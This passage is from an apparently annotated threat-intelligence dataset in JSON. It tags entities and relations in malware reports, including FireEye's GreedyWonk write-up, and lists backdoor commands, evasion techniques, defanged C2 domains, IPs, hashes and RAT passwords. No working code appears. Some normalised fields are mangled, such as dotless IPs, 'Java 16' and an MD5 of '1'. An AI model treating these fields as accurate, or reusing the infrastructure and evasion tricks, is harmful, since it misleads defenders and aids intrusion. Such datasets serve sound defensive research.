".", "Command", "\u2018g\u2019:", "Download", "and", "execute", "a", "file", ".", "The", "downloaded", "file", "has", "a", "temporarily", "file", "name"], ["prefixed", "with", "\u201cjava\u201d", "."], ["2", ".", "Command", "\u2018i\u2019:", "Run", "downloaded", "code", "(fileless)", "as", "a", "separate", "thread", ".", "The", "user-agent", "used", "is"], ["\u201cMozilla/5", ".", "0", "(Windows", "NT", "5", ".", "1)", "AppleWebKit/535", ".", "1", "(KHTML", ",", "like", "Gecko)\u201d", "."], ["3", ".", "Command", "\u2018x\u2019:", "Download", "and", "execute", ",", "follow", "by", "an", "uninstallation", "of", "\u201cGoogleUpdate", ".", "exe\u201d.", "The"], ["downloaded", "file", "has", "same", "prefix", "\u201cjava\u201d", "."], ["4", ".", "Command", "\u2018u\u2019:", "Uninstall", "\u201cGoogleUpdate", ".", "exe\u201d"], ["Figure", "17", "Backdoor", "Access"], ["Conclusion"], ["As", "defense", "technologies", "advance", ",", "malware", "also", "evolves", ".", "In", "this", "instance", ",", "we", "could", "see", "that", "the", "malware"], ["has", "performed", "a", "number", "of", "tricks", "to", "defeat", "detection", "."], ["It", "attempts", "to:"], ["1", ".", "Evade", "sandbox", "by", "detecting", "human", "behaviors", "(multiple", "mouse", "clicks);"], ["2", ".", "Evade", "network", "binary", "extraction", "technology", "by", "performing", "multi-byte", "XOR", "encryption", "on"], ["executable", "file;"], ["3", ".", "Social", "engineer", "user", "into", "thinking", "that", "the", "malware", "is", "legitimate;"], ["4", ".", "Avoid", "forensic", "and", "incidence", "response", "by", "using", "fileless", "malicious", "codes;", "and"], ["5", ".", "Prevent", "automated", "domain", "blacklisting", "by", "using", "redirection", "via", "URL", "shortening", "and", "Dynamic", "DNS"], ["services", "."], ["This", "entry", "was", "posted", "in", "Advanced", "Malware", ",", "Targeted", "Attack", "by", "Chong", "Rong", "Hwa", ".", "Bookmark", "the"], ["permalink", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "GreedyWonk", "sent_id": 0, "pos": [4]}, {"old_id": "T2", "type": "Campaign", "name": "SnowMan", "sent_id": 4, "pos": []}, {"old_id": "T3", "type": "Vulnerability", "name": "CVE-20140502", "sent_id": null, "pos": []}, {"old_id": "T4", "type": "Campaign", "name": "Operation GreedyWonk", "sent_id": null, "pos": []}, {"old_id": "T5", "type": "Campaign", "name": "GreedyWonk", "sent_id": 17, "pos": []}, {"old_id": "T6", "type": "Software", "name": "Flash", "sent_id": 9, "pos": [5]}, {"old_id": "T7", "type": "Time", "name": "Feb 13", "sent_id": 31, "pos": []}, {"old_id": "T8", "type": "Software", "name": "Adobe Flash", "sent_id": 31, "pos": []}, {"old_id": "T9", "type": "Software", "name": "Flash Player", "sent_id": 33, "pos": []}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "wwwpiie[]com", "sent_id": null, "pos": []}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "Peter G Peterson Institute for International Economics", "sent_id": null, "pos": []}, {"old_id": "T12", "type": "ExploitTargetObject", "name": "American Research Center in Egypt", "sent_id": null, "pos": []}, {"old_id": "T13", "type": "ExploitTargetObject", "name": "wwwarce[]org", "sent_id": 41, "pos": []}, {"old_id": "T14", "type": "ExploitTargetObject", "name": "Smith Richardson Foundation", "sent_id": null, "pos": []}, {"old_id": "T15", "type": "ExploitTargetObject", "name": "wwwsrf[]org", "sent_id": null, "pos": []}, {"old_id": "T16", "type": "ExploitTargetObject", "name": "Peterson Institute", "sent_id": null, "pos": []}, {"old_id": "T17", "type": "ExploitTargetObject", "name": "Smith Richardson Foundation", "sent_id": null, "pos": []}, {"old_id": "T18", "type": "SystemInformation", "name": "Windows XP", "sent_id": 52, "pos": []}, {"old_id": "T19", "type": "SystemInformation", "name": "Windows 7 and Java 16", "sent_id": null, "pos": []}, {"old_id": "T20", "type": "CourseOfAction", "name": "upgrading from Windows XP", "sent_id": null, "pos": []}, {"old_id": "T21", "type": "CourseOfAction", "name": "updating Java and Office", "sent_id": 56, "pos": []}, {"old_id": "T22", "type": "CourseOfAction", "name": "update Java to the latest 17 version", "sent_id": null, "pos": []}, {"old_id": "T23", "type": "CourseOfAction", "name": "update Microsoft Office to the latest version", "sent_id": null, "pos": []}, {"old_id": "T24", "type": "Campaign", "name": "GreedyWonk", "sent_id": 68, "pos": []}, {"old_id": "T25", "type": "Software", "name": "Adobe Flash", "sent_id": null, "pos": []}, {"old_id": "T26", "type": "Software", "name": "Windows XP", "sent_id": 77, "pos": []}, {"old_id": "T27", "type": "Exploit", "name": "return-oriented programming", "sent_id": null, "pos": []}, {"old_id": "T28", "type": "Software", "name": "Windows 7", "sent_id": null, "pos": []}, {"old_id": "T29", "type": "Exploit", "name": "hard-coded ROP chain", "sent_id": null, "pos": []}, {"old_id": "T30", "type": "Malware", "name": "MSVCR71dll", "sent_id": 84, "pos": []}, {"old_id": "T31", "type": "Malware", "name": "HXDSdll", "sent_id": 86, "pos": []}, {"old_id": "T32", "type": "Software", "name": "Microsoft Office 2007", "sent_id": null, "pos": []}, {"old_id": "T33", "type": "Software", "name": "Java 16", "sent_id": 88, "pos": []}, {"old_id": "T34", "type": "Malware", "name": "MSVCR71dll", "sent_id": null, "pos": []}, {"old_id": "T35", "type": "Organization", "name": "FireEye", "sent_id": 95, "pos": []}, {"old_id": "T36", "type": "CourseOfAction", "name": "upgrading to Java 17", "sent_id": null, "pos": []}, {"old_id": "T37", "type": "CourseOfAction", "name": "updating Microsoft Office 2007 and 2010", "sent_id": null, "pos": []}, {"old_id": "T38", "type": "MD5", "name": "507aed81e3106da8c50efb3a045c5e2b", "sent_id": 118, "pos": []}, {"old_id": "T39", "type": "Malware", "name": "PlugX", "sent_id": 117, "pos": []}, {"old_id": "T40", "type": "Malware", "name": "Kaba", "sent_id": 117, "pos": []}, {"old_id": "T41", "type": "Malware", "name": "PlugX", "sent_id": 120, "pos": [4]}, {"old_id": "T42", "type": "Time", "name": "Feb 12", "sent_id": 121, "pos": []}, {"old_id": "T43", "type": "Malware", "name": "PlugX", "sent_id": 125, "pos": []}, {"old_id": "T44", "type": "Indicator", "name": "javans1[]name", "sent_id": 127, "pos": []}, {"old_id": "T45", "type": "Indicator", "name": "adserviceno-ip[]org", "sent_id": null, "pos": []}, {"old_id": "T46", "type": "Indicator", "name": "wmins01[]us", "sent_id": 128, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "javans1[]name", "sent_id": 138, "pos": []}, {"old_id": "T48", "type": "Indicator", "name": "adserviceno-ip[]org", "sent_id": null, "pos": []}, {"old_id": "T49", "type": "Address", "name": "7412617768", "sent_id": 139, "pos": []}, {"old_id": "T50", "type": "Time", "name": "Feb 18 2014", "sent_id": null, "pos": []}, {"old_id": "T51", "type": "Indicator", "name": "wmins01us", "sent_id": null, "pos": []}, {"old_id": "T52", "type": "Address", "name": "103246246103", "sent_id": null, "pos": []}, {"old_id": "T53", "type": "Time", "name": "between July 4 2013 and July 15 2013", "sent_id": 143, "pos": []}, {"old_id": "T54", "type": "Address", "name": "19274246219", "sent_id": 144, "pos": []}, {"old_id": "T55", "type": "Time", "name": "Feb 17 2014", "sent_id": null, "pos": []}, {"old_id": "T56", "type": "Indicator", "name": "javans1[]name", "sent_id": 145, "pos": []}, {"old_id": "T57", "type": "Address", "name": "19274246219", "sent_id": 146, "pos": []}, {"old_id": "T58", "type": "Time", "name": "February 18", "sent_id": 146, "pos": []}, {"old_id": "T59", "type": "Indicator", "name": "adserviceno-ip[]org", "sent_id": null, "pos": []}, {"old_id": "T60", "type": "Indicator", "name": "javans1[]name", "sent_id": 147, "pos": []}, {"old_id": "T61", "type": "Indicator", "name": "javans1[]name", "sent_id": 147, "pos": []}, {"old_id": "T62", "type": "Indicator", "name": "wmins01[]us", "sent_id": null, "pos": []}, {"old_id": "T63", "type": "Indicator", "name": "proxyddns[]info", "sent_id": 148, "pos": []}, {"old_id": "T64", "type": "Time", "name": "2014-02-18", "sent_id": 149, "pos": []}, {"old_id": "T65", "type": "Time", "name": "2014-02-18", "sent_id": 149, "pos": []}, {"old_id": "T66", "type": "Time", "name": "2014-02-18", "sent_id": 149, "pos": []}, {"old_id": "T67", "type": "Time", "name": "2014-02-17", "sent_id": null, "pos": []}, {"old_id": "T68", "type": "Time", "name": "2013-05-02", "sent_id": 150, "pos": []}, {"old_id": "T69", "type": "Time", "name": "2014-02-19", "sent_id": 150, "pos": []}, {"old_id": "T70", "type": "Time", "name": "2014-02-19", "sent_id": 151, "pos": []}, {"old_id": "T71", "type": "Time", "name": "2014-02-18", "sent_id": 151, "pos": []}, {"old_id": "T72", "type": "Time", "name": "2014-02-17", "sent_id": 151, "pos": []}, {"old_id": "T73", "type": "Time", "name": "2014-02-18", "sent_id": 152, "pos": []}, {"old_id": "T74", "type": "Address", "name": "7412617768", "sent_id": null, "pos": []}, {"old_id": "T75", "type": "Address", "name": "7412617768", "sent_id": 153, "pos": []}, {"old_id": "T76", "type": "Address", "name": "19274246219", "sent_id": 153, "pos": []}, {"old_id": "T77", "type": "Address", "name": "19274246219", "sent_id": null, "pos": []}, {"old_id": "T78", "type": "Address", "name": "103246246103", "sent_id": 154, "pos": []}, {"old_id": "T79", "type": "Indicator", "name": "updatednsns02[]us", "sent_id": null, "pos": []}, {"old_id": "T80", "type": "Time", "name": "2013-09-06", "sent_id": 155, "pos": []}, {"old_id": "T81", "type": "Indicator", "name": "updatednsns01[]us", "sent_id": null, "pos": []}, {"old_id": "T82", "type": "Time", "name": "2013-09-06", "sent_id": 156, "pos": []}, {"old_id": "T83", "type": "Indicator", "name": "wmins01[]us", "sent_id": 156, "pos": []}, {"old_id": "T84", "type": "Time", "name": "2013-07-04", "sent_id": null, "pos": []}, {"old_id": "T85", "type": "Time", "name": "2013-09-06", "sent_id": 157, "pos": []}, {"old_id": "T86", "type": "Time", "name": "2013-09-06", "sent_id": 157, "pos": []}, {"old_id": "T87", "type": "Time", "name": "2013-07-15", "sent_id": 158, "pos": []}, {"old_id": "T88", "type": "Address", "name": "103246246103", "sent_id": 158, "pos": []}, {"old_id": "T89", "type": "Address", "name": "103246246103", "sent_id": null, "pos": []}, {"old_id": "T90", "type": "Address", "name": "103246246103", "sent_id": 159, "pos": []}, {"old_id": "T91", "type": "Indicator", "name": "wmins01[]us", "sent_id": 161, "pos": []}, {"old_id": "T92", "type": "MD5", "name": "7995a9a6a889b914e208eb924e459ebc", "sent_id": null, "pos": []}, {"old_id": "T93", "type": "MD5", "name": "bf60b8d26bc0c94dda2e3471de6ec977", "sent_id": null, "pos": []}, {"old_id": "T94", "type": "MD5", "name": "fd69793bd63c44bbb22f9c4d46873252", "sent_id": null, "pos": []}, {"old_id": "T95", "type": "Malware", "name": "PlugX", "sent_id": 163, "pos": []}, {"old_id": "T96", "type": "Malware", "name": "PlugX", "sent_id": 165, "pos": []}, {"old_id": "T97", "type": "Malware", "name": "Poison", "sent_id": null, "pos": []}, {"old_id": "T98", "type": "Malware", "name": "Poison", "sent_id": 169, "pos": []}, {"old_id": "T99", "type": "Malware", "name": "Poison", "sent_id": 170, "pos": [4]}, {"old_id": "T100", "type": "Indicator", "name": "fuckchinagovnb[]com", "sent_id": null, "pos": []}, {"old_id": "T101", "type": "Indicator", "name": "microsafesno-ip[]org", "sent_id": 166, "pos": []}, {"old_id": "T102", "type": "Time", "name": "2010-03-15", "sent_id": null, "pos": []}, {"old_id": "T103", "type": "Time", "name": "2012-06-09", "sent_id": 163, "pos": []}, {"old_id": "T104", "type": "Time", "name": "2013-03-07", "sent_id": 168, "pos": []}, {"old_id": "T105", "type": "Time", "name": "2012-06-11", "sent_id": 169, "pos": []}, {"old_id": "T106", "type": "Time", "name": "2012-06-11", "sent_id": 171, "pos": []}, {"old_id": "T107", "type": "Indicator", "name": "fuckchinagovnb[]com", "sent_id": null, "pos": []}, {"old_id": "T108", "type": "Time", "name": "2013-12-11", "sent_id": 173, "pos": []}, {"old_id": "T109", "type": "Time", "name": "2013-12-11", "sent_id": 173, "pos": []}, {"old_id": "T110", "type": "Address", "name": "204200222136", "sent_id": 174, "pos": []}, {"old_id": "T111", "type": "Time", "name": "2014-02-12", "sent_id": null, "pos": []}, {"old_id": "T112", "type": "Indicator", "name": "microsafesno-ip[]org", "sent_id": 174, "pos": []}, {"old_id": "T113", "type": "Time", "name": "2014-02-12", "sent_id": 175, "pos": []}, {"old_id": "T114", "type": "Address", "name": "7412617770", "sent_id": 175, "pos": []}, {"old_id": "T115", "type": "Indicator", "name": "microsafesno-ip[]org", "sent_id": null, "pos": []}, {"old_id": "T116", "type": "Time", "name": "2013-12-04", "sent_id": 176, "pos": []}, {"old_id": "T117", "type": "Time", "name": "2013-12-04", "sent_id": null, "pos": []}, {"old_id": "T118", "type": "Address", "name": "74126177241", "sent_id": 177, "pos": []}, {"old_id": "T119", "type": "Malware", "name": "Poison Ivy", "sent_id": 177, "pos": []}, {"old_id": "T120", "type": "Indicator", "name": "domain wmins01[]us", "sent_id": null, "pos": []}, {"old_id": "T121", "type": "MD5", "name": "88b375e3b5c50a3e6c881bc96c926928", "sent_id": null, "pos": []}, {"old_id": "T122", "type": "MD5", "name": "cd07a9e49b1f909e1bd9e39a7a6e56b4", "sent_id": null, "pos": []}, {"old_id": "T123", "type": "MD5", "name": "fd69793bd63c44bbb22f9c4d46873252", "sent_id": null, "pos": []}, {"old_id": "T124", "type": "MD5", "name": "88b375e3b5c50a3e6c881bc96c926928", "sent_id": null, "pos": []}, {"old_id": "T125", "type": "MD5", "name": "cd07a9e49b1f909e1bd9e39a7a6e56b4", "sent_id": null, "pos": []}, {"old_id": "T126", "type": "Password", "name": "java7", "sent_id": 180, "pos": []}, {"old_id": "T127", "type": "Password", "name": "admin", "sent_id": 182, "pos": []}, {"old_id": "T128", "type": "Password", "name": "admin", "sent_id": 183, "pos": []}, {"old_id": "T129", "type": "MD5", "name": "8936c87a08ffa56d19fdb87588e35952", "sent_id": null, "pos": []}, {"old_id": "T130", "type": "Malware", "name": "Poison Ivy", "sent_id": 185, "pos": []}, {"old_id": "T131", "type": "Password", "name": "java7", "sent_id": 187, "pos": []}, {"old_id": "T132", "type": "Software", "name": "Adobe Flash", "sent_id": 188, "pos": []}, {"old_id": "T133", "type": "Vulnerability", "name": "CVE-2012-0779", "sent_id": null, "pos": []}, {"old_id": "T134", "type": "ExploitTargetObject", "name": "Center for Defense Information", "sent_id": null, "pos": []}, {"old_id": "T135", "type": "ExploitTargetObject", "name": "wwwcdi[]org", "sent_id": null, "pos": []}, {"old_id": "T136", "type": "Address", "name": "159546292", "sent_id": null, "pos": []}, {"old_id": "T137", "type": "File", "name": "BrightBallsswf", "sent_id": 196, "pos": []}, {"old_id": "T138", "type": "MD5", "name": "1", "sent_id": 197, "pos": []}, {"old_id": "T139", "type": "Malware", "name": "Poison Ivy", "sent_id": 199, "pos": []}, {"old_id": "T140", "type": "Password", "name": "java7", "sent_id": 200, "pos": []}, {"old_id": "T141", "type": "Indicator", "name": "YFds*&^ff", "sent_id": 203, "pos": []}, {"old_id": "T142", "type": "Indicator", "name": "windowsddns[]us", "sent_id": null, "pos": []}, {"old_id": "T143", "type": "Indicator", "name": "windowsddns[]us", "sent_id": null, "pos": []}, {"old_id": "T144", "type": "Indicator", "name": "wmins01[]us", "sent_id": 206, "pos": []}, {"old_id": "T145", "type": "Address", "name": "767380188", "sent_id": 207, "pos": []}, {"old_id": "T146", "type": "Time", "name": "mid-2012", "sent_id": 207, "pos": []}, {"old_id": "T147", "type": "Indicator", "name": "wmins01us", "sent_id": null, "pos": []}, {"old_id": "T148", "type": "Indicator", "name": "windowsddnsus", "sent_id": 208, "pos": []}, {"old_id": "T149", "type": "Time", "name": "2012-07-07", "sent_id": null, "pos": []}, {"old_id": "T150", "type": "Time", "name": "2012-05-23", "sent_id": 209, "pos": []}, {"old_id": "T151", "type": "Time", "name": "2012-09-19", "sent_id": null, "pos": []}, {"old_id": "T152", "type": "Time", "name": "2012-06-10", "sent_id": 210, "pos": []}, {"old_id": "T153", "type": "Address", "name": "767380188", "sent_id": null, "pos": []}, {"old_id": "T154", "type": "MD5", "name": "7d810e3564c4eb95bcb3d11ce191208e", "sent_id": null, "pos": []}, {"old_id": "T155", "type": "Vulnerability", "name": "CVE-2012-0507", "sent_id": null, "pos": []}, {"old_id": "T156", "type": "MD5", "name": "52aa791a524b61b129344f10b4712f52", "sent_id": null, "pos": []}, {"old_id": "T157", "type": "Malware", "name": "Poison Ivy", "sent_id": 217, "pos": []}, {"old_id": "T158", "type": "Malware", "name": "Poison Ivy", "sent_id": 219, "pos": []}, {"old_id": "T159", "type": "Indicator", "name": "idsns01[]us", "sent_id": 220, "pos": []}, {"old_id": "T160", "type": "Indicator", "name": "idsns01[]us", "sent_id": 221, "pos": []}, {"old_id": "T161", "type": "Indicator", "name": "wmins01[]us", "sent_id": null, "pos": []}, {"old_id": "T162", "type": "Address", "name": "19418322475", "sent_id": null, "pos": []}, {"old_id": "T163", "type": "Indicator", "name": "wmins01[]us", "sent_id": 224, "pos": []}, {"old_id": "T164", "type": "Indicator", "name": "idsns01[]us", "sent_id": null, "pos": []}, {"old_id": "T165", "type": "Time", "name": "2012-07-03", "sent_id": 225, "pos": []}, {"old_id": "T166", "type": "Time", "name": "2012-04-23", "sent_id": null, "pos": []}, {"old_id": "T167", "type": "Time", "name": "2012-07-04", "sent_id": 226, "pos": []}, {"old_id": "T168", "type": "Time", "name": "2012-05-18", "sent_id": 226, "pos": []}, {"old_id": "T169", "type": "Address", "name": "19418322475", "sent_id": 227, "pos": []}, {"old_id": "T170", "type": "Address", "name": "19418322475", "sent_id": 227, "pos": []}, {"old_id": "T171", "type": "MD5", "name": "fd69793bd63c44bbb22f9c4d46873252", "sent_id": 228, "pos": []}, {"old_id": "T172", "type": "ExploitTargetObject", "name": "Center for European Policy Studies", "sent_id": null, "pos": []}, {"old_id": "T173", "type": "Malware", "name": "Poison Ivy", "sent_id": null, "pos": []}, {"old_id": "T174", "type": "ExploitTargetObject", "name": "wwwceps[]be", "sent_id": 231, "pos": []}, {"old_id": "T175", "type": "ExploitTargetObject", "name": "wwwceps[]be", "sent_id": null, "pos": []}, {"old_id": "T176", "type": "Indicator", "name": "shopfujifilm[]be", "sent_id": null, "pos": []}, {"old_id": "T177", "type": "ExploitTargetObject", "name": "wwwarce[]org", "sent_id": null, "pos": []}], "labels": [{"old_id": "R1", "r": "P19", "h": 5, "t": 2, "evidence": []}, {"old_id": "R2", "r": "P27", "h": 4, "t": 9, "evidence": []}, {"old_id": "R3", "r": "P27", "h": 4, "t": 10, "evidence": []}, {"old_id": "R4", "r": "P27", "h": 4, "t": 11, "evidence": []}, {"old_id": "R5", "r": "P27", "h": 4, "t": 12, "evidence": [17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41]}, {"old_id": "R6", "r": "P27", "h": 4, "t": 13, "evidence": []}, {"old_id": "R7", "r": "P27", "h": 4, "t": 14, "evidence": []}, {"old_id": "R8", "r": "P27", "h": 4, "t": 15, "evidence": []}, {"old_id": "R9", "r": "P27", "h": 4, "t": 16, "evidence": []}, {"old_id": "R10", "r": "P34", "h": 22, "t": 23, "evidence": []}, {"old_id": "R11", "r": "P34", "h": 21, "t": 23, "evidence": []}, {"old_id": "R12", "r": "P34", "h": 19, "t": 23, "evidence": []}, {"old_id": "R13", "r": "P34", "h": 20, "t": 23, "evidence": [56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68]}, {"old_id": "R14", "r": "P22", "h": 23, "t": 26, "evidence": []}, {"old_id": "R15", "r": "P22", "h": 23, "t": 28, "evidence": []}, {"old_id": "R16", "r": "P22", "h": 23, "t": 29, "evidence": [68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84]}, {"old_id": "R17", "r": "P22", "h": 23, "t": 30, "evidence": [68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86]}, {"old_id": "R18", "r": "P34", "h": 35, "t": 23, "evidence": []}, {"old_id": "R19", "r": "P34", "h": 36, "t": 23, "evidence": []}, {"old_id": "R20", "r": "P21", "h": 37, "t": 38, "evidence": []}, {"old_id": "R21", "r": "P21", "h": 37, "t": 39, "evidence": []}, {"old_id": "R22", "r": "P33", "h": 40, "t": 41, "evidence": [120, 121]}, {"old_id": "R23", "r": "P21", "h": 43, "t": 42, "evidence": []}, {"old_id": "R24", "r": "P21", "h": 44, "t": 42, "evidence": []}, {"old_id": "R25", "r": "P21", "h": 45, "t": 42, "evidence": []}, {"old_id": "R26", "r": "P21", "h": 119, "t": 118, "evidence": []}, {"old_id": "R27", "r": "P21", "h": 120, "t": 97, "evidence": []}, {"old_id": "R28", "r": "P33", "h": 97, "t": 104, "evidence": [169]}, {"old_id": "R29", "r": "P33", "h": 96, "t": 103, "evidence": []}, {"old_id": "R30", "r": "P21", "h": 93, "t": 96, "evidence": []}, {"old_id": "R31", "r": "P21", "h": 121, "t": 98, "evidence": []}, {"old_id": "R32", "r": "P33", "h": 98, "t": 105, "evidence": [170, 171]}, {"old_id": "R33", "r": "P21", "h": 91, "t": 94, "evidence": []}, {"old_id": "R34", "r": "P33", "h": 94, "t": 102, "evidence": [163]}, {"old_id": "R35", "r": "P21", "h": 99, "t": 94, "evidence": []}, {"old_id": "R36", "r": "P21", "h": 92, "t": 95, "evidence": []}, {"old_id": "R37", "r": "P21", "h": 100, "t": 95, "evidence": []}, {"old_id": "R38", "r": "P33", "h": 95, "t": 101, "evidence": []}, {"old_id": "R39", "r": "P21", "h": 122, "t": 118, "evidence": []}, {"old_id": "R40", "r": "P21", "h": 123, "t": 118, "evidence": []}, {"old_id": "R41", "r": "P21", "h": 124, "t": 118, "evidence": []}, {"old_id": "R42", "r": "P21", "h": 128, "t": 129, "evidence": []}, {"old_id": "R43", "r": "P19", "h": 131, "t": 132, "evidence": []}, {"old_id": "R44", "r": "P7", "h": 129, "t": 132, "evidence": []}, {"old_id": "R45", "r": "P21", "h": 136, "t": 129, "evidence": []}, {"old_id": "R46", "r": "P21", "h": 137, "t": 129, "evidence": []}, {"old_id": "R47", "r": "P21", "h": 140, "t": 138, "evidence": []}, {"old_id": "R48", "r": "P21", "h": 141, "t": 138, "evidence": []}, {"old_id": "R49", "r": "P21", "h": 142, "t": 138, "evidence": []}, {"old_id": "R50", "r": "P21", "h": 143, "t": 138, "evidence": []}, {"old_id": "R51", "r": "P33", "h": 138, "t": 145, "evidence": [199, 200, 201, 202, 203, 204, 205, 206, 207]}, {"old_id": "R52", "r": "P28", "h": 138, "t": 144, "evidence": [199, 200, 201, 202, 203, 204, 205, 206, 207]}, {"old_id": "R53", "r": "P7", "h": 156, "t": 154, "evidence": []}, {"old_id": "R54", "r": "P21", "h": 153, "t": 156, "evidence": []}, {"old_id": "R55", "r": "P21", "h": 155, "t": 156, "evidence": []}, {"old_id": "R56", "r": "P21", "h": 159, "t": 157, "evidence": []}, {"old_id": "R57", "r": "P21", "h": 158, "t": 157, "evidence": []}, {"old_id": "R58", "r": "P21", "h": 175, "t": 172, "evidence": []}, {"old_id": "R59", "r": "P21", "h": 170, "t": 172, "evidence": []}], "title": ["inputs/txt/201402FireEyeGreedyWonk"], "sents": [["T1", "Campaign", "10", "20", "GreedyWonk"], ["T2", "Campaign", "156", "163", "SnowMan"], ["T3", "Vulnerability", "410", "422", "CVE-20140502"], ["T4", "Campaign", "718", "738", "Operation", "GreedyWonk"], ["T5", "Campaign", "752", "762", "GreedyWonk"], ["T6", "Software", "309", "314", "Flash"], ["R1", "hasVulnerability", "Arg1:T6", "Arg2:T3"], ["T7", "Time", "1355", "1362", "Feb", ".", "13"], ["T8", "Software", "1394", "1405", "Adobe", "Flash"], ["T9", "Software", "1453", "1458;1459", "1465", "Flash", "Player"], ["T10", "ExploitTargetObject", "1568", "1582", "www", ".", "piie[.]com"], ["R2", "targets", "Arg1:T5", "Arg2:T10"], ["T11", "ExploitTargetObject", "1511", "1566", "Peter", "G", ".", "Peterson", "Institute", "for", "International", "Economics"], ["R3", "targets", "Arg1:T5", "Arg2:T11"], ["T12", "ExploitTargetObject", "1705", "1738", "American", "Research", "Center", "in", "Egypt"], ["T13", "ExploitTargetObject", "1740", "1754", "www", ".", "arce[.]org"], ["T14", "ExploitTargetObject", "1764", "1769;1770", "1791", "Smith", "Richardson", "Foundation"], ["T15", "ExploitTargetObject", "1793", "1806", "www", ".", "srf[.]org"], ["T16", "ExploitTargetObject", "1909", "1927", "Peterson", "Institute"], ["T17", "ExploitTargetObject", "1932", "1959", "Smith", "Richardson", "Foundation"], ["R4", "targets", "Arg1:T5", "Arg2:T12"], ["R5", "targets", "Arg1:T5", "Arg2:T13"], ["R6", "targets", "Arg1:T5", "Arg2:T14"], ["R7", "targets", "Arg1:T5", "Arg2:T15"], ["R8", "targets", "Arg1:T5", "Arg2:T16"], ["R9", "targets", "Arg1:T5", "Arg2:T17"], ["T18", "SystemInformation", "2173", "2183", "Windows", "XP"], ["T19", "SystemInformation", "2184", "2206", "Windows", "7", "and", "Java", "1", ".", "6"], ["T20", "CourseOfAction", "2312", "2337", "upgrading", "from", "Windows", "XP"], ["T21", "CourseOfAction", "2342", "2366", "updating", "Java", "and", "Office"], ["T22", "CourseOfAction", "2390", "2427", "update", "Java", "to", "the", "latest", "1", ".", "7", "version"], ["T23", "CourseOfAction", "2492", "2537", "update", "Microsoft", "Office", "to", "the", "latest", "version"], ["T24", "Campaign", "2742", "2752", "GreedyWonk"], ["R10", "mitigates", "Arg1:T23", "Arg2:T24"], ["R11", "mitigates", "Arg1:T22", "Arg2:T24"], ["R12", "mitigates", "Arg1:T20", "Arg2:T24"], ["R13", "mitigates", "Arg1:T21", "Arg2:T24"], ["T25", "Software", "2799", "2810", "Adobe", "Flash"], ["T26", "Software", "3110", "3120", "Windows", "XP"], ["T27", "Exploit", "3144", "3171", "return-oriented", "programming"], ["T28", "Software", "3309", "3318", "Windows", "7"], ["T29", "Exploit", "3340", "3360", "hard-coded", "ROP", "chain"], ["T30", "Malware", "3365", "3376", "MSVCR71", ".", "dll"], ["T31", "Malware", "3455", "3463", "HXDS", ".", "dll"], ["T32", "Software", "3508", "3529", "Microsoft", "Office", "2007"], ["T33", "Software", "3539", "3547", "Java", "1", ".", "6"], ["T34", "Malware", "3629", "3640", "MSVCR71", ".", "dll"], ["R14", "involvesMalware", "Arg1:T24", "Arg2:T27"], ["R15", "involvesMalware", "Arg1:T24", "Arg2:T29"], ["R16", "involvesMalware", "Arg1:T24", "Arg2:T30"], ["R17", "involvesMalware", "Arg1:T24", "Arg2:T31"], ["T35", "Organization", "3745", "3752", "FireEye"], ["T36", "CourseOfAction", "3773", "3794", "upgrading", "to", "Java", "1", ".", "7"], ["R18", "mitigates", "Arg1:T36", "Arg2:T24"], ["T37", "CourseOfAction", "4017", "4056", "updating", "Microsoft", "Office", "2007", "and", "2010"], ["R19", "mitigates", "Arg1:T37", "Arg2:T24"], ["T38", "MD5", "4578", "4610", "507aed81e3106da8c50efb3a045c5e2b"], ["T39", "Malware", "4516", "4521", "PlugX"], ["T40", "Malware", "4522", "4526", "Kaba"], ["R20", "indicates", "Arg1:T38", "Arg2:T39"], ["R21", "indicates", "Arg1:T38", "Arg2:T40"], ["T41", "Malware", "4658", "4663", "PlugX"], ["T42", "Time", "4687", "4694", "Feb", ".", "12"], ["R22", "hasAttackTime", "Arg1:T41", "Arg2:T42"], ["T43", "Malware", "4802", "4807", "PlugX"], ["T44", "Indicator", "4885", "4900", "java", ".", "ns1[.]name"], ["T45", "Indicator", "4901", "4922", "adservice", ".", "no-ip[.]org"], ["T46", "Indicator", "4923", "4936", "wmi", ".", "ns01[.]us"], ["R23", "indicates", "Arg1:T44", "Arg2:T43"], ["R24", "indicates", "Arg1:T45", "Arg2:T43"], ["R25", "indicates", "Arg1:T46", "Arg2:T43"], ["T47", "Indicator", "5274", "5289", "java", ".", "ns1[.]name"], ["T48", "Indicator", "5294", "5315", "adservice", ".", "no-ip[.]org"], ["T49", "Address", "5328", "5341", "74", ".", "126.177.68"], ["T50", "Time", "5345", "5358", "Feb", ".", "18", ",", "2014"], ["T51", "Indicator", "5405", "5416", "wmi", ".", "ns01.us"], ["T52", "Address", "5440", "5455", "103", ".", "246.246.103"], ["T53", "Time", "5456", "5471;5472", "5494", "between", "July", "4", ",", "2013", "and", "July", "15", ",", "2013"], ["T54", "Address", "5499", "5513", "192", ".", "74.246.219"], ["T55", "Time", "5517", "5530", "Feb", ".", "17", ",", "2014"], ["T56", "Indicator", "5532", "5547", "java", ".", "ns1[.]name"], ["T57", "Address", "5565", "5579", "192", ".", "74.246.219"], ["T58", "Time", "5583", "5594", "February", "18"], ["T59", "Indicator", "5603", "5624", "adservice", ".", "no-ip[.]org"], ["T60", "Indicator", "5625", "5640", "java", ".", "ns1[.]name"], ["T61", "Indicator", "5641", "5656", "java", ".", "ns1[.]name"], ["T62", "Indicator", "5657", "5670", "wmi", ".", "ns01[.]us"], ["T63", "Indicator", "5671", "5688", "proxy", ".", "ddns[.]info"], ["T64", "Time", "5701", "5711", "2014-02-18"], ["T65", "Time", "5712", "5722", "2014-02-18"], ["T66", "Time", "5723", "5733", "2014-02-18"], ["T67", "Time", "5734", "5744", "2014-02-17"], ["T68", "Time", "5745", "5755", "2013-05-02"], ["T69", "Time", "5767", "5777", "2014-02-19"], ["T70", "Time", "5778", "5788", "2014-02-19"], ["T71", "Time", "5789", "5799", "2014-02-18"], ["T72", "Time", "5800", "5810", "2014-02-17"], ["T73", "Time", "5811", "5821", "2014-02-18"], ["T74", "Address", "5834", "5847", "74", ".", "126.177.68"], 